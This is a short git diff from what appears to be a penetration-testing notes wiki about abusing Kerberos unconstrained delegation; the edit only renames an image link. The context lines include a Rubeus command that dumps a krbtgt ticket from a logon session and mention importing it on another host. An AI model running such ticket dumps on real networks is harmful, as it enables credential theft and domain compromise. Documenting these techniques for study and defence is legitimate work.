@@ -74,7 +74,7 @@ To simulate that unconstrained delegation is configured with a purpose we need t
 ./Rubeus.exe dump /luid:0x85e21db /service:krbtgt nowrap
 ```
 
-![](<../../../../.gitbook/assets/image (3) (1) (2).png>)
+![](<../../../../.gitbook/assets/image (3) (1).png>)
 
 6\. Then on `WS01` we can import this ticket with the following Rubeus command:
 
